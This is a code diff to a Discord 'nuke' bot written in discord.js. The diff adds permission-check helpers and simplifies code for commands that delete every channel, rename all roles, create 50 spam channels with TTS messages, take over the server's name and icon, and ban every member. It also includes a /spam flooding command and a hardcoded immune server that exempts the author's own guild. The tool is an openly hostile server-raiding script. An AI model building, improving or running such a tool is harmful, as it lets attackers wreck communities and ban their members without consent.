@@ -1,4 +1,7 @@
-const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, SlashCommandBuilder } = require('discord.js');
+const {
+  Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder,
+  ActionRowBuilder, ButtonBuilder, ButtonStyle, SlashCommandBuilder
+} = require('discord.js');
 const { joinVoiceChannel } = require('@discordjs/voice');
 
 const client = new Client({
@@ -24,6 +27,27 @@ const IMMUNE_GUILD_ID = '1518698079992287242';
 
 const nukeSessions = new Map();
 
+// ───────────────────────────────────────────────────────────────
+// Helper: check bot permissions and return missing list
+function getMissingPerms(guild, requiredPerms) {
+  const botMember = guild.members.me;
+  if (!botMember) return requiredPerms; // should not happen
+  const botPerms = botMember.permissions;
+  return requiredPerms.filter(perm => !botPerms.has(perm));
+}
+
+// Helper: check permissions and reply with missing list
+function checkPermsAndReply(message, requiredPerms) {
+  const missing = getMissingPerms(message.guild, requiredPerms);
+  if (missing.length > 0) {
+    const permNames = missing.map(p => `\`${p}\``).join(', ');
+    message.reply(`❌ I am missing the following permissions:\n${permNames}\nPlease grant them and try again.`);
+    return false;
+  }
+  return true;
+}
+
+// ─── Log embed ──────────────────────────────────────────────────
 async function sendLogEmbed(guild, executor, eventType) {
   const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
   if (!logChannel) return;
@@ -57,10 +81,10 @@ client.on('guildCreate', async (guild) => {
   await sendLogEmbed(guild, guild.owner?.tag || 'Bot Owner (via OAuth)', 'add');
 });
 
+// ─── Ready & Slash Commands ─────────────────────────────────────
 client.once('ready', async () => {
   console.log(`✅ Logged in as ${client.user.tag}`);
 
-  // Register global slash commands
   try {
     await client.application.commands.set([
       new SlashCommandBuilder()
@@ -105,17 +129,14 @@ client.once('ready', async () => {
   }
 });
 
-// Interaction handler
+// ─── Interaction handler ───────────────────────────────────────
 client.on('interactionCreate', async (interaction) => {
-  // Slash command: /spam
   if (interaction.isChatInputCommand() && interaction.commandName === 'spam') {
     const text = interaction.options.getString('text', true);
     const count = interaction.options.getInteger('count') ?? 5;
 
-    // Defer publicly – shows "bot is thinking" to everyone
     await interaction.deferReply({ ephemeral: false });
 
-    // Permission check (guild only)
     if (interaction.guild) {
       const botMember = interaction.guild.members.me;
       if (!botMember.permissions.has(PermissionsBitField.Flags.SendMessages)) {
@@ -124,7 +145,6 @@ client.on('interactionCreate', async (interaction) => {
       }
     }
 
-    // Send the spam messages
     for (let i = 0; i < count; i++) {
       try {
         await interaction.channel.send(text);
@@ -135,16 +155,10 @@ client.on('interactionCreate', async (interaction) => {
       }
     }
 
-    // Delete the "thinking" message – spam messages remain
-    try {
-      await interaction.deleteReply();
-    } catch (err) {
-      // ignore if already deleted
-    }
+    try { await interaction.deleteReply(); } catch {}
     return;
   }
 
-  // Button interactions (pause/resume)
   if (interaction.isButton()) {
     const session = nukeSessions.get(interaction.guild.id);
     if (!session) return interaction.reply({ content: 'No active nuke session.', ephemeral: true });
@@ -161,7 +175,7 @@ client.on('interactionCreate', async (interaction) => {
   }
 });
 
-// Message commands
+// ─── Message Commands ─────────────────────────────────────────────
 client.on('messageCreate', async (message) => {
   if (message.author.bot) return;
   if (!message.content.startsWith(PREFIX)) return;
@@ -169,6 +183,7 @@ client.on('messageCreate', async (message) => {
   const args = message.content.slice(PREFIX.length).trim().split(/ +/);
   const command = args[0].toLowerCase();
 
+  // Immune server protection
   if (message.guild && message.guild.id === IMMUNE_GUILD_ID) {
     if (command === 'nuke' || command === 'banall') {
       await message.reply('nice try buddy 🤣');
@@ -176,10 +191,20 @@ client.on('messageCreate', async (message) => {
     }
   }
 
-  // ───── NUKE COMMAND ─────
+  // ─── NUKE ─────────────────────────────────────────────────
   if (command === 'nuke') {
     const guild = message.guild;
     const executorId = message.author.id;
+
+    // Required permissions for full nuke
+    const requiredPerms = [
+      PermissionsBitField.Flags.ManageRoles,
+      PermissionsBitField.Flags.ManageChannels,
+      PermissionsBitField.Flags.ManageGuild,
+      PermissionsBitField.Flags.MentionEveryone, // For @everyone/@here
+      PermissionsBitField.Flags.CreateEvents,    // Optional but nice
+    ];
+    if (!checkPermsAndReply(message, requiredPerms)) return;
 
     await sendLogEmbed(guild, message.author.tag, 'nuke');
 
@@ -206,25 +231,21 @@ client.on('messageCreate', async (message) => {
 
     const statusMsg = await message.channel.send({ embeds: [embed], components: [row] });
 
-    const updateEmbed = async (renameCount, deleteCount, createCount, status) => {
+    const updateEmbed = async (renameCount, deleteCount, createCount, statusText) => {
       const updated = EmbedBuilder.from(statusMsg.embeds[0])
         .setDescription(
-          status === 'done' ? '✅ Nuke complete! Server renamed, icon changed, description set, event created.' :
-          status === 'paused' ? '⏸ Nuke paused.' :
+          statusText === 'done' ? '✅ Nuke complete! Server renamed, icon changed, description set, event created.' :
+          statusText === 'paused' ? '⏸ Nuke paused.' :
           'Nuking in progress...'
         )
-        .setColor(
-          status === 'done' ? 0x00ff00 :
-          status === 'paused' ? 0xffaa00 :
-          0xff0000
-        )
+        .setColor(statusText === 'done' ? 0x00ff00 : statusText === 'paused' ? 0xffaa00 : 0xff0000)
         .spliceFields(0, 4,
           { name: 'Roles Renamed', value: `${renameCount}`, inline: true },
           { name: 'Channels Deleted', value: `${deleteCount}`, inline: true },
           { name: 'Channels Created', value: `${createCount}`, inline: true },
-          { name: 'Status', value: status === 'done' ? '✅ Done' : status === 'paused' ? '⏸ Paused' : session.paused ? '⏸ Paused' : '🔴 Running', inline: true }
+          { name: 'Status', value: statusText === 'done' ? '✅ Done' : statusText === 'paused' ? '⏸ Paused' : session.paused ? '⏸ Paused' : '🔴 Running', inline: true }
         );
-      await statusMsg.edit({ embeds: [updated], components: (status === 'done') ? [] : [row] }).catch(() => {});
+      await statusMsg.edit({ embeds: [updated], components: (statusText === 'done') ? [] : [row] }).catch(() => {});
     };
 
     const waitWhilePaused = async () => {
@@ -250,18 +271,16 @@ client.on('messageCreate', async (message) => {
       await Promise.allSettled(
         chunk.map(async (role) => {
           await waitWhilePaused();
-          const renamePromise = role.setName(RENAME_TEXT, 'Nuke command')
-            .then(() => {
-              renameCount++;
-              return updateEmbed(renameCount, deleteCount, createCount, 'running');
-            });
-          const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Rename timed out')), 30000));
-          try { await Promise.race([renamePromise, timeoutPromise]); } catch {}
+          try {
+            await role.setName(RENAME_TEXT, 'Nuke command');
+            renameCount++;
+            await updateEmbed(renameCount, deleteCount, createCount, 'running');
+          } catch {}
         })
       );
     }
 
-    // Step 2: Delete channels
+    // Step 2: Delete all channels
     const allChannels = [...guild.channels.cache.values()];
     await Promise.allSettled(
       allChannels.map(async (channel) => {
@@ -269,12 +288,12 @@ client.on('messageCreate', async (message) => {
         try {
           await channel.delete('Nuke command');
           deleteCount++;
-          await updateEmbed(renameCount, deleteCount, createCount, 'running').catch(() => {});
+          await updateEmbed(renameCount, deleteCount, createCount, 'running');
         } catch {}
       })
     );
 
-    // Step 3: Create 50 channels with TTS
+    // Step 3: Create 50 channels and spam TTS
     const createPromises = Array(50).fill().map(async () => {
       try {
         const ch = await guild.channels.create({ name: NUKE_CHANNEL_NAME, reason: 'Nuke command' });
@@ -287,19 +306,20 @@ client.on('messageCreate', async (message) => {
     });
     const results = await Promise.allSettled(createPromises);
     createCount = results.filter(r => r.status === 'fulfilled' && r.value !== null).length;
+    await updateEmbed(renameCount, deleteCount, createCount, 'running');
 
-    // Step 4: Rename server
+    // Step 4: Rename server (needs ManageGuild)
     try { await guild.setName(RENAME_TEXT, 'Nuke command'); } catch {}
 
-    // Step 5: Icon & description
+    // Step 5: Change icon and description (needs ManageGuild)
     try {
       const response = await fetch(ICON_URL);
       const buffer = Buffer.from(await response.arrayBuffer());
       await guild.setIcon(buffer, 'Nuke command');
-    } catch (err) { console.error('Failed to set icon:', err); }
-    try { await guild.setDescription(SERVER_DESCRIPTION, 'Nuke command'); } catch (err) { console.error('Failed to set description:', err); }
+    } catch { console.error('Failed to set icon.'); }
+    try { await guild.setDescription(SERVER_DESCRIPTION, 'Nuke command'); } catch {}
 
-    // Step 6: Create event
+    // Step 6: Create event (needs CreateEvents)
     if (createdChannels.length > 0) {
       const firstChannel = createdChannels[0];
       const startTime = new Date();
@@ -317,10 +337,10 @@ client.on('messageCreate', async (message) => {
           channel: firstChannel.id,
           reason: 'Nuke command'
         });
-      } catch (err) { console.error('Failed to create event:', err); }
+      } catch { console.error('Failed to create event.'); }
     }
 
-    // Final embed
+    // Final message
     if (createdChannels.length > 0) {
       const finalEmbed = new EmbedBuilder()
         .setTitle('💀 NUKE COMPLETE')
@@ -342,12 +362,12 @@ client.on('messageCreate', async (message) => {
     nukeSessions.delete(guild.id);
   }
 
-  // ───── BANALL COMMAND ─────
+  // ─── BANALL ───────────────────────────────────────────────
   if (command === 'banall') {
     const guild = message.guild;
-    if (!guild.members.me.permissions.has(PermissionsBitField.Flags.BanMembers)) {
-      return message.reply('❌ I need the **Ban Members** permission to execute this!');
-    }
+
+    const requiredPerms = [PermissionsBitField.Flags.BanMembers];
+    if (!checkPermsAndReply(message, requiredPerms)) return;
 
     const embed = new EmbedBuilder()
       .setTitle('🔨 BANNING ALL MEMBERS')
@@ -369,14 +389,14 @@ client.on('messageCreate', async (message) => {
     const membersToBan = allMembers.filter(m => m.id !== botMember.id);
     const total = membersToBan.length;
 
-    const updateBanEmbed = (bannedCount, status) => {
+    const updateBanEmbed = (bannedCount, statusText) => {
       const updated = EmbedBuilder.from(statusMsg.embeds[0])
-        .setDescription(status === 'done' ? '✅ All members banned!' : `Banning members... (${bannedCount}/${total})`)
-        .setColor(status === 'done' ? 0x00ff00 : 0xff0000)
+        .setDescription(statusText === 'done' ? '✅ All members banned!' : `Banning members... (${bannedCount}/${total})`)
+        .setColor(statusText === 'done' ? 0x00ff00 : 0xff0000)
         .spliceFields(0, 3,
           { name: 'Total Members', value: `${total}`, inline: true },
           { name: 'Banned', value: `${bannedCount}`, inline: true },
-          { name: 'Status', value: status === 'done' ? '✅ Done' : '🔴 Running', inline: true }
+          { name: 'Status', value: statusText === 'done' ? '✅ Done' : '🔴 Running', inline: true }
         );
       statusMsg.edit({ embeds: [updated] }).catch(() => {});
     };
